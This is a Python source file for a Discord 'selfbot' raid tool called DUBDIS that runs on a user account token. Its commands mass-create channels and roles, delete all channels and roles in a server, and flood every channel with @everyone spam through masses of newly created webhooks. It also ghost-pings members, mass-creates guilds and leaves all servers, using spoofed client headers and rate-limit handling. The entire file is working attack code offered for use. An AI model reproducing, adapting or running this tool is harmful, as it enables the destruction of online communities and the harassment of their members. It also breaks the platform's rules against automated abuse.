token = ""
prefix = "!"
try:
    import discord
except:
    os.system("pip install discord")
    import discord

from ast import While
from re import T
from discord.ext import commands
import os
import random
import threading
import requests
from pystyle import Colors,Colorate,Anime
from json import loads
import datetime
from time import sleep
from colorama import Fore
from scprint import print, rainbow


client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                      self_bot=True)
def spam():
    print(f'''
                                {Fore.LIGHTBLUE_EX}▓█████▄  █    ██  ▄▄▄▄   ▓█████▄  ██▓  ██████ 
                                {Fore.LIGHTBLUE_EX}▒██▀ ██▌ ██  ▓██▒▓█████▄ ▒██▀ ██▌▓██▒▒██    ▒ 
                                {Fore.LIGHTBLUE_EX}░██   █▌▓██  ▒██░▒██▒ ▄██░██   █▌▒██▒░ ▓██▄   
                                {Fore.LIGHTBLUE_EX}░▓█▄   ▌▓▓█  ░██░▒██░█▀  ░▓█▄   ▌░██░  ▒   ██▒
                                {Fore.LIGHTBLUE_EX}░▒████▓ ▒▒█████▓ ░▓█  ▀█▓░▒████▓ ░██░▒██████▒▒
                                {Fore.LIGHTBLUE_EX}▒▒▓  ▒ ░▒▓▒ ▒ ▒ ░▒▓███▀▒ ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░
                                {Fore.LIGHTBLUE_EX}░ ▒  ▒ ░░▒░ ░ ░ ▒░▒   ░  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░
                                {Fore.LIGHTBLUE_EX}░ ░  ░  ░░░ ░ ░  ░    ░  ░ ░  ░  ▒ ░░  ░  ░  
                                {Fore.LIGHTBLUE_EX}░       ░      ░         ░     ░        ░  
                                {Fore.LIGHTBLUE_EX}░                     ░  ░                   


{space}{Fore.LIGHTWHITE_EX}(1) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}textspam (amount) (name) {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}spam creates a text channels
{space}{Fore.LIGHTWHITE_EX}(2) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}voicechannelspam (amount) (name) {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}spam creates a text channels
{space}{Fore.LIGHTWHITE_EX}(3) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}rolespam (amount) (name) {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}spam creates a roles
{space}{Fore.LIGHTWHITE_EX}(4) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}dal {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}delete all channels
{space}{Fore.LIGHTWHITE_EX}(5) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}delroles {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}delete most roles
{space}{Fore.LIGHTWHITE_EX}(6) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}Swk {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}webhook spam
{space}{Fore.LIGHTWHITE_EX}(7) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}cls{Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}ClearCmd
{space}{Fore.LIGHTWHITE_EX}(8) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}cg (amount) (name) {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}Create Guild Server
{space}{Fore.LIGHTWHITE_EX}(9) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}leaveallserver{Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}leaveallserver
{space}{Fore.LIGHTWHITE_EX}(10) {Fore.CYAN}{prefix}{Fore.LIGHTCYAN_EX}ghostpings (mode) (amount){Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}ghostping mode = all,one
    ''')
def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

content = '@everyone'
description = f'```{randstr(40)}```\n'+ randstr(2500)
image_url = 'https://media.discordapp.net/attachments/988692449943748628/995314890011049985/discord-banner-4.gif?width=704&height=396'
webhook_name = f'{randstr(40)}'
webhook_title = f'{randstr(40)}'
time = datetime.datetime.utcnow()
title_url = 'https://cdn.discordapp.com/attachments/970584055978549261/984807297123504168/f929762526a03a67bd9ea88e93633d84.png'
icon_url = ''
avatar_url = 'https://cdn.discordapp.com/attachments/970584055978549261/984807297123504168/f929762526a03a67bd9ea88e93633d84.png'
footer = ''

color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "

def webspam(webhook):
            global spammingdawebhookeroos
            while spammingdawebhookeroos:
                randcolor = random.randint(0x000000, 0xFFFFFF)
                data = {
                "content": f"{content}",
                "embeds": [
                    {
                    "title": f"{webhook_title}",
                    "tts": "true",
                    "description": f"\n{description}",
                    "url": f"{image_url}",
                    "color": f"{randcolor}",
                    "timestamp": f"{time}",
                    "author": {
                        "name": f"{webhook_name}",
                        "url": f"{title_url}",
                        "icon_url": f"{icon_url}"
                    },
                    "footer": {
                        "text": f"{footer}",
                        "icon_url": f"{icon_url}"
                    },
                    "image": {
                        
                        "url": f"{image_url}"
                    }
                    }
                ],
                "username": f"{webhook_name}",
                "avatar_url": f"{avatar_url}"
                }
                spamming = requests.post(webhook, json=data)  
                spammingerror = spamming.text
                if spamming.status_code == 204:
                    pass
                
                elif "rate limited" in spammingerror.lower():
                    try:
                        j = loads(spammingerror)
                        ratelimit = j['retry_after']
                        timetowait = ratelimit / 1000
                        sleep(timetowait)
                    except:
                        delay = random.randint(5, 10)
                        sleep(delay)
                else:
                    delay = random.randint(30, 60)
                    sleep(delay)

headerrs = {'Authorization': f'{token}',
    "accept": "*/*",
    'origin': 'https://discord.com',
    'sec - fetch - mode': 'cors',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    'sec - fetch - site': 'same - origin',
    'x - debug - options': 'bugReporterEnabled',
    'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
}

mainHeader = {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
}
def voicecspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v9/guilds/{guild}/channels",headers=headers,json={"type":"2","name":nameofchan})
    except:
        pass
def textcspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v9/guilds/{guild}/channels",headers=headers,json={"type":"0","name":f'{nameofchan}'})
    except:
        pass
def deletechannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v9/channels/{channeldetails}",headers=headers)
    except:
        pass
def createguild(name):
    try:
        payload = {"name": name}
        requests.post("https://discord.com/api/v9/guilds",headers=mainHeader,json=payload)
    except:
        pass
def leaveserver():
    try:
        headers = {"authorization": token, "user-agent": "bruh6/9"}
        dsa = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for serr in dsa:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                headers=headers,
            )
    except:
        pass
def sendev(channel):
    while True:
        requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',headers=mainHeader,json={"content": "@everyone"})

def change(channel,name):
    try:
        requests.patch(f'https://discord.com/api/v9/channels/{channel}',headers=mainHeader,json={"name": name})
    except:
        pass
def deleterole(guild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{roledetails}",headers=headers)
    except:
        pass

def spamrole(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        randcolor = random.randint(0x000000, 0xFFFFFF)
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
    except:
        pass
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name="กำลังใช้โปรแกรมยิงดิส", url="https://www.twitch.tv/dsa"))
    os.system(f'cls & title DUBDIS LOGIN TO {client.user}')
    os.system("cls")
    spam()
@client.command()
async def cls(ctx):
    await ctx.message.delete()
    os.system("cls")
    spam()
@client.command()
async def cg(ctx,amount,name):
    await ctx.message.delete()
    for i in range(int(amount)):
        print(f'{Fore.WHITE}[{Fore.GREEN}{i}{Fore.WHITE}] {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.RED}Create Guild {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{name}{Fore.WHITE}]')
        threading.Thread(target=createguild,args=(name)).start()
@client.command()
async def leaveallserver(ctx):
    await ctx.message.delete()
    for i in range(200):
        threading.Thread(target=leaveserver).start()

@client.command()
async def textspam(ctx,amount=None,*,namechannelcreate=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,namechannelcreate)).start()
        print(f'{Fore.WHITE}[{Fore.GREEN}{i}{Fore.WHITE}] {Fore.RED}Create Channels {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{namechannelcreate}{Fore.WHITE}]')

@client.command()
async def voicechannelspam(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = voicecspam, args = (ctx.guild.id,nameofthem,)).start()
        print(f'{Fore.WHITE}[{Fore.GREEN}{i}{Fore.WHITE}] {Fore.RED}Create Channels {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{nameofthem}{Fore.WHITE}]')
    

@client.command()
async def dal(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        threading.Thread(target = deletechannel, args = (channel.id,)).start()
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.RED}Delete Channels {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{channel.name}{Fore.WHITE}]')

@client.command()
async def Cwk(ctx):
    await ctx.message.delete()
    try:
        if len(ctx.guild.text_channels) >= 500:
            webhookamount = 10
        else:
            webhookamount = 500 / len(ctx.guild.text_channels) 
            webhookamount = int(webhookamount) + 10
        for i in range(webhookamount):
            for channel in ctx.guild.text_channels:
                print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.RED}CreateWebHook {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{channel.id}{Fore.WHITE}]')
                await channel.create_webhook(name=f"{str(webhook_name)}")
    except:
        pass

@client.command()
async def Swk(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webspam, args = (webhook.url,)).start()
            print(Colorate.Horizontal(Colors.rainbow,f"SpamWebHook {webhook}"))
    if len(ctx.guild.text_channels) >= 500:
        webhookamount = 10
    else:
        webhookamount = 500 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 10
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            webhook = await channel.create_webhook(name=f"{str(webhook_name)}")
            threading.Thread(target = webspam, args = (webhook.url,)).start()
            print(Colorate.Horizontal(Colors.rainbow,f"SpamWebHook {channel.name}"))

@client.command()
async def delroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target=deleterole,args =(ctx.guild.id,rol.id,)).start()
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}[{Fore.RED}DeleteRole{Fore.WHITE}] {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{rol.name}{Fore.WHITE}]')

@client.command()
async def rolespam(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target=spamrole,args =(ctx.guild.id,nameofthem,)).start()
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}[{Fore.RED}CreateRole{Fore.WHITE}] {Fore.WHITE}[{Fore.LIGHTBLUE_EX}{nameofthem}{Fore.WHITE}]')

@client.command()
async def ghostpings(ctx, mode, amount):
    await ctx.message.delete()
    if mode == ("all"):
        try:
            for i in range(int(amount)):
                for channel in ctx.guild.text_channels:
                    message = "@everyone"
                    await channel.send(content=message, delete_after=0.1)
        except:
            pass
    elif mode == ("one"):
        try:
            for i in range(int(amount)):
                message = "@everyone"
                await ctx.send(content=message, delete_after=0.1)
        except:
            pass
    else:
        pass

client.run(token, bot=False)